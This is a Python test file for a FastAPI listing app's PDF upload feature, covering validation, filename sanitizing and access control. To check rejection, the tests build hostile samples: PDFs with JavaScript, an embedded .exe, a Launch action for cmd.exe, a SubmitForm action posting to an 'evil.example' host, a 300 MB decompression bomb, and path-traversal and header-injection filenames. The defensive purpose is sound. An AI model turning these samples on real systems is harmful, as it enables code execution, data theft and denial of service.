"""Tests for listing PDF documents: validation (app/documents.py) and the API."""

import io
import tempfile
import time
import zlib
import unittest
from pathlib import Path
from unittest.mock import patch

from fastapi import HTTPException, UploadFile
from fastapi.testclient import TestClient
from pypdf import PdfReader, PdfWriter
from pypdf.generic import (
    ArrayObject,
    DecodedStreamObject,
    DictionaryObject,
    NameObject,
    RectangleObject,
    TextStringObject,
)

from app.config import settings
from app.database import get_db
from app.dependencies import get_current_user
from app import documents
from app.documents import sanitize_original_name, save_document
from app.main import app
from app.models import Category, Condition, Document, Listing, User
from tests.helpers import make_memory_session


def make_pdf(pages: int = 1, *, metadata: dict | None = None, js: bool = False,
             attachment: bool = False, user_password: str | None = None,
             owner_password: str | None = None) -> bytes:
    writer = PdfWriter()
    for _ in range(pages):
        writer.add_blank_page(200, 200)
    if metadata:
        writer.add_metadata(metadata)
    if js:
        # A JavaScript action that runs when the document is opened.
        writer.root_object[NameObject("/OpenAction")] = DictionaryObject({
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): TextStringObject("app.alert(1)"),
        })
    if attachment:
        writer.add_attachment("x.exe", b"MZ")
    if user_password is not None or owner_password is not None:
        writer.encrypt(user_password=user_password or "", owner_password=owner_password, algorithm="AES-256")
    out = io.BytesIO()
    writer.write(out)
    return out.getvalue()


def action(kind: str, **entries: str) -> DictionaryObject:
    """A PDF action such as << /S /Launch /F (cmd.exe) >>."""
    result = DictionaryObject({NameObject("/S"): NameObject(kind)})
    for key, value in entries.items():
        result[NameObject(f"/{key}")] = TextStringObject(value)
    return result


def pdf_with_link(link_action: DictionaryObject) -> bytes:
    """One page with a clickable area that runs the given action."""
    writer = PdfWriter()
    page = writer.add_blank_page(200, 200)
    annotation = DictionaryObject({
        NameObject("/Type"): NameObject("/Annot"),
        NameObject("/Subtype"): NameObject("/Link"),
        NameObject("/Rect"): RectangleObject([0, 0, 100, 100]),
        NameObject("/A"): link_action,
    })
    page[NameObject("/Annots")] = ArrayObject([writer._add_object(annotation)])
    out = io.BytesIO()
    writer.write(out)
    return out.getvalue()


def pdf_with_bookmarks(count: int, javascript_at: int | None = None) -> bytes:
    """Bookmarks are a linked list (/Next), so each one is a level deeper."""
    writer = PdfWriter()
    writer.add_blank_page(200, 200)
    items = [writer.add_outline_item(f"Capítulo {i}", 0) for i in range(count)]
    if javascript_at is not None:
        items[javascript_at].get_object()[NameObject("/A")] = action("/JavaScript", JS="app.alert(1)")
    out = io.BytesIO()
    writer.write(out)
    return out.getvalue()


def upload(data: bytes, name: str = "manual.pdf") -> UploadFile:
    return UploadFile(file=io.BytesIO(data), filename=name)


class TempDocumentsRoot(unittest.TestCase):
    """Every test writes into its own temporary documents folder."""

    def setUp(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name)
        patcher = patch.object(settings, "documents_root", str(self.root))
        patcher.start()
        self.addCleanup(patcher.stop)

    def stored_files(self) -> list[Path]:
        return sorted(self.root.glob("*.pdf"))


class SaveDocumentTestCase(TempDocumentsRoot):
    def assert_rejected(self, data: bytes, status_code: int) -> None:
        with self.assertRaises(HTTPException) as ctx:
            save_document(upload(data))
        self.assertEqual(ctx.exception.status_code, status_code)
        self.assertEqual(self.stored_files(), [], "a rejected file must not be stored")

    def test_accepts_a_plain_pdf_and_stores_it_without_metadata(self) -> None:
        saved = save_document(upload(make_pdf(2, metadata={"/Author": "Maria Silva"})))

        self.assertEqual(saved.page_count, 2)
        self.assertEqual(saved.original_name, "manual.pdf")
        self.assertRegex(saved.file_name, r"^[0-9a-f]{32}\.pdf$")
        stored = (self.root / saved.file_name).read_bytes()
        self.assertEqual(saved.size_bytes, len(stored))
        self.assertNotIn(b"Maria Silva", stored)
        self.assertIsNone(PdfReader(io.BytesIO(stored)).metadata)

    def test_accepts_a_pdf_protected_only_against_editing_and_drops_the_protection(self) -> None:
        saved = save_document(upload(make_pdf(owner_password="owner")))

        stored = PdfReader(io.BytesIO((self.root / saved.file_name).read_bytes()))
        self.assertFalse(stored.is_encrypted)

    def test_rejects_a_file_over_the_size_limit(self) -> None:
        with patch.object(settings, "max_document_bytes", 100):
            self.assert_rejected(make_pdf(), 413)

    def test_rejects_files_that_are_not_pdfs(self) -> None:
        self.assert_rejected(b"\x89PNG\r\n\x1a\n" + b"0" * 100, 415)  # PNG renamed to .pdf
        self.assert_rejected(b"%PDF-1.4\n<html><script>alert(1)</script></html>", 415)  # polyglot
        self.assert_rejected(make_pdf()[:200], 415)  # truncated

    def test_rejects_a_pdf_that_needs_a_password_to_open(self) -> None:
        self.assert_rejected(make_pdf(user_password="secret", owner_password="owner"), 422)

    def test_rejects_too_many_pages(self) -> None:
        self.assert_rejected(make_pdf(settings.max_document_pages + 1), 422)

    def test_never_decodes_a_compressed_stream_bomb(self) -> None:
        # 300 MB of zeros compressed into ~0.3 MB, hung from the catalog. The
        # checks only walk dictionaries and the rewrite copies streams as
        # they are, so the bomb is never expanded.
        compressor = zlib.compressobj(9)
        chunk = b"\0" * (1024 * 1024)
        bomb = b"".join(compressor.compress(chunk) for _ in range(300)) + compressor.flush()
        writer = PdfWriter()
        writer.add_blank_page(200, 200)
        stream = DecodedStreamObject()
        stream.set_data(b"x")
        writer.root_object[NameObject("/PieceInfo")] = writer._add_object(stream)
        out = io.BytesIO()
        writer.write(out)
        pdf = out.getvalue().replace(b"/Length 1", b"/Filter /FlateDecode /Length %d" % len(bomb), 1)
        pdf = pdf.replace(b"stream\nx\nendstream", b"stream\n" + bomb + b"\nendstream", 1)

        started = time.monotonic()
        saved = save_document(upload(pdf))

        self.assertLess(time.monotonic() - started, 5)
        self.assertLess(saved.size_bytes, settings.max_document_bytes)

    def test_rejects_active_content(self) -> None:
        self.assert_rejected(make_pdf(js=True), 422)
        self.assert_rejected(make_pdf(attachment=True), 422)

    def test_rejects_actions_that_run_on_click(self) -> None:
        # The action type is the VALUE of /S, not a key.
        self.assert_rejected(pdf_with_link(action("/Launch", F="cmd.exe")), 422)
        self.assert_rejected(pdf_with_link(action("/SubmitForm", F="https://evil.example/collect")), 422)
        self.assert_rejected(pdf_with_link(action("/GoToR", F="other.pdf")), 422)

    def test_accepts_plain_links(self) -> None:
        saved = save_document(upload(pdf_with_link(action("/URI", URI="https://daka.example"))))

        self.assertEqual(saved.page_count, 1)

    def test_accepts_many_bookmarks(self) -> None:
        # 60 bookmarks are 60+ levels deep: depth alone must not reject a file.
        saved = save_document(upload(pdf_with_bookmarks(60)))

        self.assertEqual(saved.page_count, 1)

    def test_finds_javascript_however_deep_it_is_hidden(self) -> None:
        # Bookmark 41 of 80 is ~40 links away from both ends of the list.
        self.assert_rejected(pdf_with_bookmarks(80, javascript_at=40), 422)

    def test_rejects_a_document_too_big_to_check_completely(self) -> None:
        # Fail-closed: what the check could not see is not accepted.
        with patch.object(documents, "MAX_WALK_NODES", 5):
            with self.assertRaises(HTTPException) as ctx:
                save_document(upload(pdf_with_bookmarks(10)))
        self.assertEqual(ctx.exception.status_code, 422)
        self.assertEqual(ctx.exception.detail, "The document is too complex to be checked.")


class SanitizeOriginalNameTestCase(unittest.TestCase):
    def test_keeps_only_a_safe_file_name_ending_in_pdf(self) -> None:
        cases = {
            "Manual da máquina.pdf": "Manual da máquina.pdf",
            "C:\\Users\\ana\\fatura.PDF": "fatura.pdf",
            "../../etc/passwd": "passwd.pdf",
            "nome\r\nX-Injected: 1.pdf": "nomeX-Injected: 1.pdf",
            "fatura\u202efdp.exe": "faturafdp.exe.pdf",
            "": "documento.pdf",
            None: "documento.pdf",
            ".pdf": "documento.pdf",
        }
        for raw, expected in cases.items():
            self.assertEqual(sanitize_original_name(raw), expected, repr(raw))

    def test_limits_the_length(self) -> None:
        name = sanitize_original_name("a" * 400 + ".pdf")
        self.assertEqual(len(name), 150)
        self.assertTrue(name.endswith(".pdf"))


class ListingDocumentsEndpointsTestCase(TempDocumentsRoot):
    def setUp(self) -> None:
        super().setUp()
        self.db, self.listing_states, _, _ = make_memory_session()
        self.owner = User(user_name="Ana", email="ana-docs@example.test")
        self.other = User(user_name="Rui", email="rui-docs@example.test")
        category = Category(category_name="Books")
        condition = Condition(condition_name="Good")
        self.db.add_all([self.owner, self.other, category, condition])
        self.db.commit()
        self.listing = Listing(
            user_id=self.owner.id,
            category_id=category.id,
            condition_id=condition.id,
            state_id=self.listing_states["Available"].id,
            title="Livros",
        )
        self.db.add(self.listing)
        self.db.commit()

        app.dependency_overrides[get_db] = lambda: self.db
        app.dependency_overrides[get_current_user] = lambda: self.current_user
        self.current_user = self.owner
        self.client = TestClient(app)
        self.addCleanup(self.client.close)
        self.addCleanup(app.dependency_overrides.clear)
        self.addCleanup(self.db.close)

    def post_document(self, data: bytes | None = None, name: str = "manual.pdf"):
        return self.client.post(
            f"/listings/{self.listing.id}/documents",
            files={"file": (name, data if data is not None else make_pdf(), "application/pdf")},
        )

    def test_owner_attaches_a_document_shown_in_the_listing_detail(self) -> None:
        response = self.post_document(name="Fatura.pdf")

        self.assertEqual(response.status_code, 201, response.text)
        [doc] = response.json()["documents"]
        self.assertEqual(doc["original_name"], "Fatura.pdf")
        self.assertEqual(doc["page_count"], 1)
        self.assertNotIn("file_name", doc)
        detail = self.client.get(f"/listings/{self.listing.id}").json()
        self.assertEqual([d["id"] for d in detail["documents"]], [doc["id"]])

    def test_only_the_owner_can_attach_or_delete(self) -> None:
        doc_id = self.post_document().json()["documents"][0]["id"]
        self.current_user = self.other

        self.assertEqual(self.post_document().status_code, 403)
        self.assertEqual(
            self.client.delete(f"/listings/{self.listing.id}/documents/{doc_id}").status_code, 403
        )

    def test_a_listing_has_at_most_the_configured_number_of_documents(self) -> None:
        for _ in range(settings.max_documents_per_listing):
            self.assertEqual(self.post_document().status_code, 201)

        response = self.post_document()

        self.assertEqual(response.status_code, 409)
        self.assertEqual(len(self.stored_files()), settings.max_documents_per_listing)

    def test_an_invalid_file_is_rejected_and_nothing_is_stored(self) -> None:
        response = self.post_document(b"not a pdf")

        self.assertEqual(response.status_code, 415)
        self.assertEqual(self.db.query(Document).count(), 0)
        self.assertEqual(self.stored_files(), [])

    def test_the_file_needs_a_session(self) -> None:
        doc_id = self.post_document().json()["documents"][0]["id"]
        # Back to the real dependency: no session cookie means 401.
        del app.dependency_overrides[get_current_user]

        response = self.client.get(f"/listings/{self.listing.id}/documents/{doc_id}/file")

        self.assertEqual(response.status_code, 401)

    def test_a_logged_in_user_opens_the_pdf_inline_with_its_original_name(self) -> None:
        doc_id = self.post_document(name="Manual.pdf").json()["documents"][0]["id"]
        self.current_user = self.other

        response = self.client.get(f"/listings/{self.listing.id}/documents/{doc_id}/file")

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.headers["content-type"], "application/pdf")
        self.assertEqual(response.headers["content-disposition"], 'inline; filename="Manual.pdf"')
        self.assertEqual(response.headers["x-content-type-options"], "nosniff")
        self.assertEqual(response.headers["cache-control"], "private, no-store")
        self.assertTrue(response.content.startswith(b"%PDF-"))

    def test_a_listing_that_is_not_available_only_shows_its_documents_to_the_owner(self) -> None:
        doc_id = self.post_document().json()["documents"][0]["id"]
        self.listing.state_id = self.listing_states["Reserved"].id
        self.db.commit()
        url = f"/listings/{self.listing.id}/documents/{doc_id}/file"

        self.assertEqual(self.client.get(url).status_code, 200)
        self.current_user = self.other
        self.assertEqual(self.client.get(url).status_code, 404)

    def test_a_document_of_another_listing_is_not_found(self) -> None:
        doc_id = self.post_document().json()["documents"][0]["id"]

        response = self.client.get(f"/listings/{self.listing.id + 1}/documents/{doc_id}/file")

        self.assertEqual(response.status_code, 404)

    def test_deleting_a_document_removes_the_row_and_the_file(self) -> None:
        doc_id = self.post_document().json()["documents"][0]["id"]

        response = self.client.delete(f"/listings/{self.listing.id}/documents/{doc_id}")

        self.assertEqual(response.status_code, 200, response.text)
        self.assertEqual(response.json()["documents"], [])
        self.assertEqual(self.stored_files(), [])

    def test_removing_the_listing_deletes_its_documents(self) -> None:
        self.post_document()

        response = self.client.delete(f"/listings/{self.listing.id}")

        self.assertEqual(response.status_code, 204, response.text)
        self.assertEqual(self.db.query(Document).count(), 0)
        self.assertEqual(self.stored_files(), [])

    def test_deleting_the_account_deletes_the_documents_of_its_listings(self) -> None:
        self.post_document()

        response = self.client.delete("/auth/me")

        self.assertEqual(response.status_code, 204, response.text)
        self.assertEqual(self.db.query(Document).count(), 0)
        self.assertEqual(self.stored_files(), [])


if __name__ == "__main__":
    unittest.main()
